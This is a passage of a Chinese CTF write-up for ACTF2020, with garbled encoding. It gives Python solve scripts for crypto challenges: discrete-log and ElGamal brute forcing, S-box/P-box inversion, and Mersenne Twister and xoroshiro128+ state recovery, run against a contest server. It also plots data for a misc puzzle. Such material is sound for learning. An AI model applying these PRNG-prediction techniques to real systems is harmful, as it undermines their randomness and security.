(string.ascii_letters + string.digits + <span class="string">"-&#123;&#125;"</span>).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">not</span> <span class="keyword">in</span> flag_dist:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    message1 = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"c="</span>)</span><br><span class="line">        c = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        y = bsgs(g, c, p)</span><br><span class="line">        <span class="keyword">if</span> len(y):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> y:</span><br><span class="line">                <span class="keyword">if</span> check(long_to_bytes(_)):</span><br><span class="line">                    message1 += long_to_bytes(_)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Failed."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    message1 = message1.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(message1)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message1)</span><br><span class="line">    <span class="keyword">return</span> message1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"pubkey= ("</span>)</span><br><span class="line">    pubkey = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    pubkey = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> pubkey.split(<span class="string">","</span>)]</span><br><span class="line">    e, g, p = pubkey[<span class="number">0</span>], pubkey[<span class="number">1</span>], pubkey[<span class="number">2</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"cipher= ("</span>)</span><br><span class="line">    cipher = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    cipher = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> cipher.split(<span class="string">","</span>)]</span><br><span class="line">    a, b = cipher[<span class="number">0</span>], cipher[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">        message2 = long_to_bytes((inverse(pow(a, d, p), p) * b) % p)</span><br><span class="line">        <span class="keyword">if</span> check(message2):</span><br><span class="line">            message2 = (long_to_bytes(d) + message2).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            print(message2)</span><br><span class="line">            io.sendlineafter(<span class="string">"input the message:"</span>, message2)</span><br><span class="line">            <span class="keyword">return</span> message2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    params = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    regex = re.compile(<span class="string">"a=(\d+), b=(\d+)"</span>)</span><br><span class="line">    params = regex.findall(params)[<span class="number">0</span>]</span><br><span class="line">    a, b = int(params[<span class="number">0</span>]), int(params[<span class="number">1</span>])</span><br><span class="line">    Ep = EllipticCurve(GF(p), [a, b])</span><br><span class="line">    message3 = []</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        s = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        regex = re.compile(<span class="string">"G=\((\d+),(\d+)\),C=(\d+)"</span>)</span><br><span class="line">        s = regex.findall(s)[<span class="number">0</span>]</span><br><span class="line">        x, y, c = int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])</span><br><span class="line">        G = Ep(x, y)</span><br><span class="line">        C = <span class="number">10000</span> * G</span><br><span class="line">        message3.append(c // int(C[<span class="number">0</span>]))</span><br><span class="line">    message3 = <span class="string">""</span>.join(chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> message3)</span><br><span class="line">    print(message3)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message3)</span><br><span class="line">    <span class="keyword">return</span> message3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    print(level1() + level2() + level3())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Imitation-game"><a href="#Imitation-game" class="headerlink" title="Imitation game"></a>Imitation game</h3><h4 id="é¢˜è§£åˆ†æ-5"><a href="#é¢˜è§£åˆ†æ-5" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iv=getRandomRange(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,message)</span>:</span></span><br><span class="line">    padding=[iv]   </span><br><span class="line">    cipher=[message[<span class="number">0</span>]^padding[<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len_flag):</span><br><span class="line">        <span class="comment">#print(cipher)</span></span><br><span class="line">        padding.append(cipher[i<span class="number">-1</span>]^padding[i<span class="number">-1</span>])</span><br><span class="line">        cipher.append(message[i]^padding[i])</span><br><span class="line">    print(<span class="string">"cipher=&#123;&#125;"</span>.format(cipher))</span><br></pre></td></tr></table></figure><p>å³$cipher=[m[0]\oplus iv,m[1]\oplus m[0],â€¦,m[n-1]\oplus m[n-2]]$.</p><p>æ‰€ä»¥çˆ†ç ´ivè·å¾—254ç§å¯èƒ½ä¸­é—´æ€.</p><p>è€Œä¸­é—´æ€å’Œflagé—´å…³ç³»å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    message=strxor(flag,plaintext[i])</span><br><span class="line">    encrypt(iv,message)</span><br></pre></td></tr></table></figure><p>MTPè€å¥—è·¯äº†- -</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="[exp]"></a>[exp]</h4><p>jupyteré‡Œæ‰‹æ“ï¼Œè€Œä¸”æœ¬é¢˜ä¸­MTPä¸è®ºæ˜¯ç”¨çŒœæµ‹ç©ºæ ¼è¿˜æ˜¯å­—é¢‘åˆ†æéƒ½å­˜åœ¨ä¸€å®šè¯¯å·®ï¼Œéœ€æ‰‹åŠ¨è°ƒæ•´- -è€æ¯›ç—…äº†ï¼ˆä¼°è®¡ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘ä¸€ç›´ç”¨çš„é¢‘ç‡è¡¨ä¸å¤ªå¯¹</p><h3 id="naive-aes"><a href="#naive-aes" class="headerlink" title="naive aes"></a>naive aes</h3><h4 id="é¢˜è§£åˆ†æ-6"><a href="#é¢˜è§£åˆ†æ-6" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>è€ƒå¯Ÿç®€å•çš„Sç›’åŠPç›’é€†å‘ç®—æ³•</p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(<span class="string">"actf.node.csuaurora.org"</span>, <span class="string">"28627"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexpad</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    numZeros = <span class="number">8</span> - len(hexBlock)</span><br><span class="line">    <span class="keyword">return</span> numZeros * <span class="string">"0"</span> + hexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_substitute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    substitutedHexBlock = <span class="string">""</span></span><br><span class="line">    substitution = [<span class="number">8</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> hexDigit <span class="keyword">in</span> hexBlock:</span><br><span class="line">        newDigit = substitution.index(int(hexDigit, <span class="number">16</span>))</span><br><span class="line">        substitutedHexBlock += hex(newDigit)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> substitutedHexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    inv_permutation = [<span class="number">22</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">17</span>,</span><br><span class="line">                      <span class="number">28</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">10</span>]</span><br><span class="line">    block = int(hexBlock, <span class="number">16</span>)</span><br><span class="line">    permutedBlock = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        bit = (block &amp; (<span class="number">1</span> &lt;&lt; i)) &gt;&gt; i</span><br><span class="line">        permutedBlock |= bit &lt;&lt; inv_permutation[i]</span><br><span class="line">    <span class="keyword">return</span> hexpad(hex(permutedBlock)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_round</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    numBlocks = len(hexMessage) // <span class="number">8</span></span><br><span class="line">    permutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        permutedHexMessage += inv_permute(hexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    substitutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        substitutedHexMessage += inv_substitute(permutedHexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> substitutedHexMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        hexMessage = dec_round(hexMessage)</span><br><span class="line">    <span class="keyword">return</span> unhexlify(hexMessage.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    hexMessage = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(decrypt(hexMessage))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="tiny-PRNG0"><a href="#tiny-PRNG0" class="headerlink" title="tiny_PRNG0"></a>tiny_PRNG0</h3><h4 id="é¢˜è§£åˆ†æ-7"><a href="#é¢˜è§£åˆ†æ-7" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>MT predictï¼Œä¹Ÿæ˜¯ç»å…¸è€ƒç‚¹äº†ï¼Œé¢˜ç›®èƒ½å¾—åˆ°æ— é™é•¿çš„éšæœºæ•°æµï¼Œå–624ä¸ªå³å¯.</p><p>å¯ä»¥ç”¨è‡ªå·±å†™çš„è„šæœ¬<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace" target="_blank" rel="noopener">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mtâ€”-predictbacktrace</a>ï¼Œä¹Ÿå¯ä»¥ç”¨randcrack.</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line">data = [...]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><p>é¢„æµ‹æˆåŠŸä¸€æ¬¡å³è·å¾—flag.</p><h3 id="tiny-PRNG1"><a href="#tiny-PRNG1" class="headerlink" title="tiny_PRNG1"></a>tiny_PRNG1</h3><h4 id="é¢˜è§£åˆ†æ-8"><a href="#é¢˜è§£åˆ†æ-8" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> s[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">rotl</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint64_t</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">next</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> s0 = s[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">uint64_t</span> s1 = s[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> result = s0 + s1;</span><br><span class="line"></span><br><span class="line">  s1 ^= s0;</span><br><span class="line">  s[<span class="number">0</span>] = rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>);</span><br><span class="line">  s[<span class="number">1</span>] = rotl(s1, <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">s[<span class="number">0</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">5</span>);</span><br><span class="line">s[<span class="number">1</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">13</span>);</span><br><span class="line">assert((<span class="string">"Flag length correct"</span>, <span class="built_in">strlen</span>(flag) == <span class="number">22</span>));</span><br></pre></td></tr></table></figure><p>nextçš„reå¾ˆç®€å•ï¼Œä½†è¾“å‡ºåªæ˜¯s0+s1ï¼Œæ¨äº†æŒºé•¿ä¸€æ®µæ—¶é—´è§‰å¾—æŒºéº»çƒ¦çš„ï¼Œå°±å°è¯•ç”¨z3ç›´æ¥æ±‚è§£ï¼Œå‰è¿ç»­ä¸¤ä¸ªreså³å¯ç¡®å®šç§å­.</p><p>æ‹¿åˆ°flagä»¥åå‘ç°æ˜¯xoroshiro128plus- -</p><h4 id="exp-8"><a href="#exp-8" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotl</span><span class="params">(x, k)</span>:</span></span><br><span class="line"><span class="keyword">return</span> ((x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k))) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(s0, s1)</span>:</span></span><br><span class="line">s1 ^= s0</span><br><span class="line"><span class="keyword">return</span> (rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>)) &amp; mask, rotl(s1, <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">fl, fr = BitVecs(<span class="string">'fl fr'</span>, <span class="number">64</span>)</span><br><span class="line">s0, s1 = fl, fr</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> argv[<span class="number">1</span>:]:</span><br><span class="line">solver.add((s0 + s1) &amp; mask == int(res, <span class="number">0</span>))</span><br><span class="line">s0, s1 = next(s0, s1)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> solver.check() != sat:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">flag = solver.model()</span><br><span class="line">flag_left, flag_right = flag[fl].as_long(), flag[fr].as_long()</span><br><span class="line">print(<span class="string">"[&#123;&#125;] - &#123;&#125; | &#123;&#125;"</span>.format(cnt, long_to_bytes(flag_left), long_to_bytes(flag_right)))</span><br><span class="line">solver.add(And(fl != flag[fl], fr != flag[fr]))</span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># [1] - b'rihsorox' | b'sulp821o'</span></span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>å…¬ä¼—å·å›å¤</p><h3 id="ç¥å¥‡çš„æ—¶é’Ÿ"><a href="#ç¥å¥‡çš„æ—¶é’Ÿ" class="headerlink" title="ç¥å¥‡çš„æ—¶é’Ÿ"></a>ç¥å¥‡çš„æ—¶é’Ÿ</h3><h4 id="é¢˜è§£åˆ†æ-9"><a href="#é¢˜è§£åˆ†æ-9" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>hintç»™äº†æ–°åŠ å¡æ¨Ÿå®œæœºåœºï¼ŒæŸ¥äº†ä¸‹æ—¶é’Ÿå¢™å°±çŸ¥é“æ€ä¹ˆå›äº‹äº†- -</p><p>csvæ–‡ä»¶ä¸­ç»™å‡ºçš„å‡ä¸ºæ€»ç§’æ•°ï¼Œç”¨matplotlibç»˜å›¾å³å¯</p><p><img src= "/img/loading.gif" data-src="/2020/06/06/WriteUp-ACTF2020/image-20200604195637685.png" alt></p><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.lines <span class="keyword">import</span> Line2D</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = [[...],[...],...]</span><br><span class="line"><span class="comment"># (min, sec)</span></span><br><span class="line">params = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">    param = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        param.append(((col % <span class="number">3600</span>) // <span class="number">60</span>, col % <span class="number">60</span>))</span><br><span class="line">    params.append(param)</span><br><span class="line"><span class="comment"># (delta_x, delta_y)</span></span><br><span class="line">delta = &#123;<span class="number">0</span>: (<span class="number">0</span>, <span class="number">0.5</span>), <span class="number">7</span>: (<span class="number">0.353</span>, <span class="number">0.354</span>), <span class="number">10</span>: (<span class="number">0.433</span>, <span class="number">0.25</span>), <span class="number">15</span>: (<span class="number">0.5</span>, <span class="number">0</span>), <span class="number">20</span>: (<span class="number">0.433</span>, <span class="number">-0.25</span>), <span class="number">23</span>: (<span class="number">0.353</span>, <span class="number">-0.354</span>), <span class="number">30</span>: (<span class="number">0</span>, <span class="number">-0.5</span>), <span class="number">37</span>: (<span class="number">-0.353</span>, <span class="number">-0.354</span>), <span class="number">40</span>: (<span class="number">-0.433</span>, <span class="number">-0.25</span>), <span class="number">45</span>: (<span class="number">-0.5</span>, <span class="number">0</span>), <span class="number">50</span>: (<span class="number">-0.433</span>, <span class="number">0.25</span>), <span class="number">53</span>: (<span class="number">-0.353</span>, <span class="number">0.354</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># draw</span></span><br><span class="line">figure, ax = plt.subplots()</span><br><span class="line">ax.set_xlim(left=<span class="number">0</span>, right=<span class="number">115</span>)</span><br><span class="line">ax.set_ylim(bottom=<span class="number">0</span>, top=<span 